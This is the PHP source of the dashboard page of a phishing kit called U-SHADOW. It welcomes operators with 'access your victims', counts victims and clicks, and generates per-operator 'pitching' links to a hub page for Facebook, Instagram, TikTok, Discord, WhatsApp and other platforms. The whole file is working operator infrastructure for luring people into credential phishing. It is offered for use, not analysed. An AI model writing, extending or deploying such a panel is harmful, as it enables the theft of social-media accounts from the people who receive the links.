<?php
require_once __DIR__ . '/config.php';
if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}
$user = $_SESSION['user'];

$analytics_data = json_decode(file_get_contents(ANALYTICS_FILE), true);
$user_analytics = array_filter($analytics_data, function($v) use ($user) {
    return $v['user_id'] === $user['username'];
});
$clicks_count = count($user_analytics);
$categories_raw = json_decode(file_get_contents(CATEGORIES_FILE), true);
$categories = [];
foreach ($categories_raw as $cat) {
    if (is_array($cat)) {
        $categories[] = $cat;
    } else {
        $categories[] = ['name' => $cat, 'image' => ''];
    }
}

// Group analytics by category for stats
$cat_stats = [];
foreach ($user_analytics as $click) {
    $cat = $click['category'];
    $cat_stats[$cat] = ($cat_stats[$cat] ?? 0) + 1;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U-SHADOW | Dashboard</title>
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="old-dashboard-body">

<div class="container-old">
    <header class="header-old">
        <div class="brand-top">U-SHADOW</div>
        <div class="telegram-banner">
             <a href="https://t.me/your_telegram" target="_blank" class="btn-telegram">
                <i class="fab fa-telegram"></i> Join Our Telegram
             </a>
        </div>
    </header>

    <nav class="navbar-old">
        <ul>
            <li><a href="dashboard.php"><i class="fas fa-home"></i> Home</a></li>
            <?php if ($user['is_admin'] ?? false): ?>
                <li><a href="/admin/index.php"><i class="fas fa-user-shield"></i> Admin Panel</a></li>
            <?php endif; ?>
            <li><a href="signup.php" style="display: none;"><i class="fas fa-user-plus"></i> Sign Up</a></li>
            <li><a href="#"><i class="fas fa-cut"></i> Short Your Link</a></li>
            <li><a href="#"><i class="fab fa-facebook"></i> Facebook</a></li>
            <li><a href="#"><i class="fas fa-envelope"></i> Contact</a></li>
            <li><a href="logout.php"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
        </ul>
    </nav>

    <main class="main-old">
        <div class="breadcrumb-old">.: Dashboard :.</div>
        <div class="welcome-msg">
            Welcome back, <strong><?php echo s($user['username']); ?></strong>!<br>
            You can now access your victims and manage your account.
        </div>

        <section class="panel-old">
            <div class="panel-header-old">Your Statistics</div>
            <div class="panel-body-old">
                <p>Victims: <?php echo $clicks_count; ?></p>
                <p>Links generated: <?php echo count($categories); ?></p>
            </div>
        </section>

        <section class="panel-old">
            <div class="panel-header-old">Generate Links</div>
            <div class="panel-body-old">
                <p>Select a category to generate your pitching link:</p>
                <div class="link-list-vertical">
                    <?php
                    $icons = [
                        'facebook' => 'fa-brands fa-facebook',
                        'instagram' => 'fa-brands fa-instagram',
                        'tiktok' => 'fa-brands fa-tiktok',
                        'snapchat' => 'fa-brands fa-snapchat',
                        'telegram' => 'fa-brands fa-telegram',
                        'discord' => 'fa-brands fa-discord',
                        'twitter' => 'fa-brands fa-twitter',
                        'x' => 'fa-brands fa-x-twitter',
                        'youtube' => 'fa-brands fa-youtube',
                        'pinterest' => 'fa-brands fa-pinterest',
                        'linkedin' => 'fa-brands fa-linkedin',
                        'whatsapp' => 'fa-brands fa-whatsapp',
                        'slack' => 'fa-brands fa-slack',
                        'twitch' => 'fa-brands fa-twitch',
                        'spotify' => 'fa-brands fa-spotify'
                    ];
                    foreach ($categories as $cat):
                        $cat_name = $cat['name'];
                        $cat_image = $cat['image'];
                        $cat_clean = str_replace(' ', '', strtolower($cat_name));
                        $icon_class = $icons[$cat_clean] ?? 'fa-solid fa-link';
                        $generated_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]/hub.php?cat=" . $cat_clean . "&user=" . urlencode($user['username']);
                    ?>
                        <div class="link-row-old">
                            <div class="link-row-link">
                                <div class="copy-container-old" style="margin: 0;">
                                    <input type="text" value="<?php echo s($generated_link); ?>" id="link-<?php echo $cat_clean; ?>" readonly>
                                    <button onclick="copyLink('link-<?php echo $cat_clean; ?>', this)">Copy</button>
                                </div>
                            </div>
                            <div class="link-row-info">
                                <?php if ($cat_image): ?>
                                    <img src="<?php echo s($cat_image); ?>" alt="<?php echo s($cat_name); ?>" class="hub-logo-tiny">
                                <?php else: ?>
                                    <i class="<?php echo $icon_class; ?>" style="font-size: 16px; margin-right: 8px;"></i>
                                <?php endif; ?>
                                <strong><?php echo s($cat_name); ?></strong>
                            </div>
                            <div class="link-row-clicks">
                                <span class="badge" style="background: #eee; color: #666;">Clicks: <?php echo $cat_stats[$cat_clean] ?? 0; ?></span>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
            </div>
        </section>
    </main>

    <footer class="footer-old">
        Copyright 2010-2025 | This Website Is Devlopped By K24KDX <br>
        <strong>U-SHADOW v3.5 &copy;</strong>
    </footer>
</div>

<script>
function copyLink(id, btn) {
    var copyText = document.getElementById(id);
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(copyText.value);

    var originalText = btn.innerHTML;
    btn.innerHTML = "Copied!";
    setTimeout(function() {
        btn.innerHTML = originalText;
    }, 1500);
}
</script>

</body>
</html>
